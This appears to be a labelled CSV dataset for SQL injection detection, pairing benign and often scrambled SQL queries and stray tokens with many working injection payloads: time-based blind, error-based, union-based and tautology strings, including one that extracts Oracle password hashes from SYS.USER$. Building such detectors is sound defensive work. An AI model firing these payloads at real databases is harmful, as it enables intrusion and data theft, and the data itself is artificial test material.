Query,Label
1'|| ( select 'tcfy' where 4546 = 4546 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',1
3641,0
"1"" where 7005 = 7005",1
"SELECT customername, contactname FROM customers;",0
svenn-er,0
"SELECT feet, thrown+ ', ' + mother+ ' ' + needle+ ', ' + kitchen AS cloud FROM rabbit",0
lladorre,0
SELECT day ( s ) FROM exchange,0
"1 ) ) as tuxy where 6855 = 6855 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
cervantes,0
"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""bfko"" = ""bfko",1
"1' ) union all select null,null--",1
SELECT * FROM upper WHERE seat LIKE '%ice%',0
"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 5220 = 5220",1
sirola@professionalhost.cc,0
"select * from users where id = 1 or 1#""1 union select 1,version ( ) -- 1",1
select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",1
1s,1
SELECT * FROM strip,0
"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""azpb"" = ""azpb",1
SELECT * FROM slide WHERE hall BETWEEN 10 AND 20,0
"1' in boolean mode ) union all select null,null,null,null,null#",1
"1"" where 7631 = 7631 and 4733 = 3439",1
"1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1
"select * from generate_series ( 9964,9964,case when ( 9964 = 4455 ) then 1 else 0 end ) limit 1--",1
SELECT * FROM studying WHERE ought NOT LIKE '[down]%',0
"SELECT Orders.fireplacerID, Employees.captain, Employees.seed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.forID ORDER BY Orders.slowID",0
SELECT AVG ( Price ) FROM Products;,0
1' ) ) as myws where 5274 = 5274,1
1%' ) ) rlike sleep ( 5 ) and ( ( '%' = ',1
38182378d,0
SELECT * FROM son FETCH FIRST 3 ROWS ONLY,0
"1 ) as ndgd where 2367 = 2367 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
8.09757E+15,0
select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --,1
capa0r980,0
SELECT someone ( s FROM brief RIGHT JOIN,0
"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'rdpv' = 'rdpv",1
"1 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
5.57567E+15,0
"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'gbhd' = 'gbhd",1
1%' ) and 2949 = 4847 and ( '%' = ',1
pierre-y,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'cgou' like 'cgou",1
SELECT TOP 3 * FROM its WHERE circus = 'pack',0
ac6di9o,0
SELECT next ( s ) FROM cattle INNER JOIN,0
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'clhg' = 'clhg",1
"SELECT spin, truth, cotton FROM struggle WHERE whether IS NULL",0
rub de bracamonte,0
navia de suarna,0
1 ) ) as rcbz where 4563 = 4563 and 2006 = 2006,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT COUNT ( action ) FROM title,0
SELECT * FROM nothing WHERE quick NOT LIKE '[share]%',0
or 1 --',1
"1"" where 4183 = 4183 union all select null,null,null,null,null,null--",1
"1,iif ( 7475 = 7475,1,1/0 )",1
"SELECT ""HELLO"" = ""hello"";",0
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
SELECT CHARACTER_LENGTH ( CustomerName ) AS LengthOfName FROM Customers;,0
if ( 8537 = 7034 ) select 8537 else drop function vqmp--,1
drohocka@baybay.mq,0
"SELECT HOUR ( ""838:59:59"" ) ;",0
"1"" where 1982 = 1982",1
"UPDATE call SET member = 'fifteen', City = 'roar' WHERE first = spend",0
"SELECT * FROM happy ORDER BY power, promised",0
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',0
lengua barrios,0
"SELECT track AS be, increase AS [task] FROM on",0
40146763x,0
"select * from generate_series ( 9434,9434,case when ( 9434 = 3991 ) then 1 else 0 end ) limit 1--",1
"1"" ) where 7471 = 7471 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"-9881"" ) ) or 9850 = 8118#",1
"-7531' ) ) ) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1
"1"" and ( 1668 = 8054 ) *8054",1
"1%' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",1
"SELECT Employees.carry, COUNT ( Orders.referID ) AS dreamFROM ( OrdersINNER JOIN explanation ON Orders.blowID = Employees.exerciseID )",0
22010612a,0
"reinosa 98, 13-e",0
"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#",1
SELECT potatoes ( s ) FROM search LEFT JOIN,0
"-6636' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'kgip' = 'kgip",1
SELECT * FROM cent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM smoke,0
"SELECT fruitID AS ID, aware AS select FROM society",0
SELECT * FROM perfect,0
1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',1
tanchak,0
"-8794 ) ) ) union all select 5802,5802,5802--",1
"1'+ ( select kgon where 9014 = 9014 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",1
SELECT * FROM buffalo,0
32170,0
1%' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = ',1
7.75898E+15,0
SELECT * FROM immediately FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM together,0
"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
toi,0
SELECT * FROM enemy WHERE torn = 'village' AND City = 'safety',0
-7962' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"; if not ( substring ( ( select @@version ) ,25,1 ) <> 5 ) waitfor delay '0:0:2' --",1
SELECT TOP 50 PERCENT * FROM choice,0
select * from users where id = 1.<@. or 1 = 1 -- 1,1
"1"" ) ) as spvl where 2242 = 2242 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",1
1'|| ( select 'ypqa' where 1961 = 1961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',1
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'hfxu' like 'hfxu",1
SELECT * FROM iron WHERE supply = 'least' AND ( advice = 'lot' OR party = 'potatoes' ),0
22496795n,0
"1"" and 4595 = 4595#",1
SELECT drew,0
"1' where 4245 = 4245 union all select null,null--",1
SELECT MIN ( loose ) AS arrow FROM these,0
SELECT * FROM worried WHERE badly = 'week' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM she 3 SELECT * FROM further,0
19332,0
"1%' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( '%' = '",1
1%' ) and 2006 = 2006,1
SELECT TOP 50 PERCENT * FROM month SELECT * FROM which FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM definition,0
end# ckxq,1
"-5819%"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,1
"1 ) ) as huxq where 7451 = 7451 union all select null,null,null--",1
SELECT * FROM cream FETCH FIRST 50 PERCENT ROWS ONLY,0
filis,0
select ( case when ( 5914 = 2314 ) then 5914 else 1/ ( select 0 ) end ) --,1
"SELECT speed,exchange,gave,shown,above ( ( orbit JOIN thought ON food.caught = fought.does ) INNER JOIN mountainON Orders.somewhere = under.betweenID )",0
"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",1
"SELECT bagID AS ID, rush AS young FROM material",0
SELECT column_name AS alias_name FROM table_name;,0
"1"" ) as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",1
select ( case when ( 5752 = 6036 ) then 1 else 5752* ( select 5752 from master..sysdatabases ) end ) --,1
"1' and elt ( 1210 = 1210,sleep ( 5 ) )",1
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY,0
"sant sever 63, 6-b",0
SELECT AVG ( funny ) FROM early SELECT SUM ( monkey ),0
maeya,0
SELECT COUNT ( angry ) FROM everywhere,0
DELETE FROM nearest,0
SELECT COUNT ( fence ) FROM dangerous,0
"SELECT * FROM mean WHERE zipper IN ( 'herd', 'prove', 'valley' )",0
"-3749"" or elt ( 1032 = 1032,3623 ) and ""mzrw"" = ""mzrw",1
1' ) ) as yefv where 4263 = 4263,1
hasan,0
7.64748E+15,0
"1' ) where 9951 = 9951 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1
sprouse,0
"-3359 union all select 4675,4675,4675--",1
1 ) ) as pmff where 6649 = 6649,1
"1%"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""%"" = """,1
"1' ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""qqky"" like ""qqky",1
"-9382' ) union all select 4774,4774,4774,4774--",1
"1%"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""%"" = """,1
SELECT jump ( s ) FROM passage LEFT JOIN,0
"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
"SELECT Orders.enterrID, Employees.effect, Employees.why FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.appleID ORDER BY Orders.shelfID",0
1.20453E+15,0
3u23pe,0
"SELECT dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog AS pipe FROM frighten",0
"SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0
select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master..sysdatabases ) end ) --,1
"1%"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""%"" = """,1
SELECT * FROM personal 3,0
9.18E+15,0
"-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 = 6840",1
"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw",1
"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1 ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 9509 = 9509",1
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT shot,bigger,needed,population,beyond ( ( forth JOIN discuss ON thrown.number = trouble.produce ) INNER JOIN indicateON Orders.arrive = neck.unusualID )",0
SELECT * FROM cup 3 SELECT * FROM jungle,0
"SELECT * FROM along ORDER BY available, so",0
"1' in boolean mode ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",1
"1"" ) union all select null,null,null,null,null,null,null,null#",1
%27%20AND%201%3D1%20--,1
"SELECT DATEDIFF ( ""2017-06-25 09:34:21"", ""2017-06-15 15:25:35"" ) ;",0
"SELECT second,term,jack,affect,field ( ( cup JOIN shoe ON add.orange = space.contain ) INNER JOIN tipON Orders.percent = distance.changeID )",0
bernette2,0
mikel,0
llanes,0
"end and ( ( ""kvts"" like ""kvts",1
9810,0
SELECT * FROM imagine ORDER BY practice,0
5631,0
SELECT * FROM office WHERE four IN ( SELECT shelter FROM badly ),0
"-8349 ) union all select 8126,8126#",1
SELECT * FROM essential WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM giant WHERE forget = 'naturally' AND City = 'view',0
23991331p,0
SELECT * FROM solid FETCH FIRST 3 ROWS ONLY,0
UPDATE paper SET damage = 'stood'WHERE behavior = 'drawn',0
"-7887' ) union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1
"fernandez latorre 14,",0
91512497m,0
"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",1
SELECT * FROM composition ORDER BY enough,0
"-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,1
"-8053"" where 5458 = 5458 or 9323 = 9323#",1
"INSERT INTO remove ( scale, facing, troops, select, he, grabbed ) VALUES ( 'press', 'wind'. space', 'slow', 'alone', 'throughout', 'visit' )",0
1.02549E+15,0
3146,0
"1%"" and sleep ( 5 ) #",1
villar del ro,0
"1"" where 1203 = 1203 union all select null,null,null--",1
"SELECT original,policeman FROM guide WHERE away = 'bright' UNION SELECT keep, coffee FROM grow",0
"-8186%' or elt ( 1032 = 1032,3623 ) and '%' = '",1
"1'+ ( select 'mxei' where 7811 = 7811 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
SELECT * FROM past WHERE shoe NOT LIKE '[cost]%',0
"1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#",1
1'|| ( select 'uiyj' from dual where 8320 = 8320,1
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),1
"pl. poeta badenes, 48, 11-c",0
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'bacm' = 'bacm",1
1'|| ( select 'ogyu' from dual where 6691 = 6691,1
20115,0
SELECT option_value FROM wp_options WHERE option_name = '_houzez_property_label_2874' LIMIT 1,0
"1%"" ) ) union all select null,null#",1
8.16E+15,0
"-3063%"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,1
filomena,0
"1%"" ) ) union all select null,null,null--",1
2.6419E+15,0
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
5900,0
-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,1
SELECT * FROM seen WHERE listen BETWEEN '1996-07-01' AND '1996-07-31',0
tormellas,0
SELECT TOP 3 * FROM bottle WHERE easy = 'settlers',0
SELECT AVG ( manufacturing ) FROM valley SELECT SUM ( see ),0
SELECT * FROM frozen,0
godofredo,0
22115972t,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
"-8919"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""nstr"" = ""nstr",1
71579092x,0
"-8129' ) ) ) union all select 4531,4531,4531#",1
1 ) as afxc where 7497 = 7497,1
"1' in boolean mode ) union all select null,null,null,null,null,null,null#",1
"1 ) as zqxa where 5718 = 5718 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( '%' = ',1
1' where 2145 = 2145,1
SELECT TOP 3 * FROM wait WHERE electric = 'southern',0
25576,0
replace,1
"SELECT fastened, curious+ ', ' + after+ ' ' + hole+ ', ' + jungle AS safety FROM hold",0
SELECT TOP 50 PERCENT * FROM hunter SELECT * FROM kitchen FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fat,0
"1' in boolean mode ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",1
SELECT Count ( * ) AS dried,0
SELECT * FROM bee FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( method ) FROM fort,0
SELECT COUNT ( thumb ) FROM elephant,0
SELECT * FROM feathers,0
"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT MIN ( produce ) AS boy FROM donkey,0
SELECT AVG ( musical ) FROM dead SELECT SUM ( road ),0
23670,0
) or ( 'a' = 'a,1
"SELECT ballID AS ID, table AS fallen FROM frighten",0
"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""zhxm"" = ""zhxm",1
SELECT TOP 3 * FROM ill WHERE store = 'sister' SELECT * FROM feet,0
SELECT * FROM Customers WHERE Country = 'Germany' AND City = 'Berlin';,0
"select sleep ( 5 ) and ( ( ( ""%"" = """,1
SELECT several,0
"-5903%' ) union all select 8293,8293,8293,8293,8293,8293,8293,8293#",1
"SELECT tired AS history, slide AS [too] FROM plenty",0
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,0
"SELECT POSITION ( ""a"" IN CustomerName ) FROM Customers;",0
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 299801 ) ORDER BY meta_id ASC",0
-2992' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'tjgt' = 'tjgt,1
SELECT * FROM create,0
"1' where 4272 = 4272 union all select null,null,null,null#",1
29611,0
SELECT TOP number | percent column_name FROM table_name WHERE condition ;,0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex' = 'kiex",1
"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
"SELECT * FROM tide WHERE pie IN ( 'particles', 'count', 'knife' )",0
SELECT go ( s ) FROM remarkable,0
SELECT COUNT ( whetherID ) FROM partly,0
SELECT MIN ( mud ) AS parallel FROM around,0
-3450' where 4478 = 4478 or 9323 = 9323#,1
"-1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
SELECT * FROM struggle WHERE until IN ( SELECT hot FROM happen ),0
"1"" ) ) or sleep ( 5 ) and ( ( ""mtmb"" like ""mtmb",1
"-5014%"" ) ) ) or 3348 = 2430--",1
"SELECT street AS corner, business AS [beauty] FROM climb",0
6390,0
-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,1
1745,0
SELECT raise,0
"select * from users where id = 1 union select 1||@,version ( ) -- 1",1
SELECT AVG ( alphabet ) FROM opinion SELECT SUM ( climb ),0
SELECT * FROM biggest WHERE aboard = 'lamp' AND ( practice = 'canal' OR back = 'desert' ),0
"1%"" ) ) waitfor delay '0:0:5'--",1
SELECT bottom FROM noted,0
1' ) as tqdg where 9355 = 9355,1
"1"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
SELECT * FROM tribe ORDER BY river,0
SELECT tea ( s ) FROM improve INNER JOIN,0
SELECT * FROM dot WHERE broken = 'mine' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM giant WHERE at BETWEEN '1996-07-01' AND '1996-07-31',0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1
"SELECT * FROM wherever ORDER BY consonant ASC, within DESC",0
-8028%' ) ) ) or 5042 = 5214,1
"-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --",1
"SELECT class, fast, offer FROM beside WHERE arrive IS NULL",0
SELECT * FROM common WHERE struggle = 'none' OR silk = 'fifteen',0
musson@ajuntamentdebarcelona20.pr,0
SELECT * FROM ( SELECT place FROM likely ),0
"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mwyu' = 'mwyu",1
"torre de esteban hambrn, la",0
poca urzagaste,0
"1"" ) ) as chal where 6661 = 6661",1
"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1
"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1
SELECT * FROM jack WHERE view LIKE '%knowledge%',0
1 ) and sleep ( 5 ) #,1
SELECT MIN ( slabs ) AS expect FROM ride,0
corrius,0
6260,0
1' ) where 2090 = 2090,1
SELECT AVG ( Price ) FROM carried,0
7.84149E+15,0
"' AND (SELECT SUBSTRING(banner,1,1) FROM v$version WHERE rownum=1)='O' --",1
SELECT COUNT ( won ) FROM stick,0
-7453' ) ) ) or 8571 = 8571--,1
8.51136E+15,0
"1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,1
"SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID = successful.came ORDER BY harbor.load",0
SELECT * FROM fall,0
"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",1
waitfor delay '0:0:5' ) +',1
49515,0
SELECT whistle ( s ) FROM mine FULL OUTER JOIN,0
jara escobedo,0
DELETE FROM colony,0
SELECT TOP 50 PERCENT * FROM unusual SELECT * FROM fourth FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gold,0
"1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'tkcy' like 'tkcy",1
"1'+ ( select ummn where 8883 = 8883 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +'",1
-9389' ) or 8859 = 3989--,1
1' where 5335 = 5335,1
SELECT * FROM wonder WHERE rocket NOT BETWEEN 'example' AND 'spider',0
villalobn,0
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1
"1"" ) as vdim where 1296 = 1296",1
o1e6e2d6,0
bl!teo,0
"1 ) as zdym where 1578 = 1578 union all select null,null,null#",1
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1
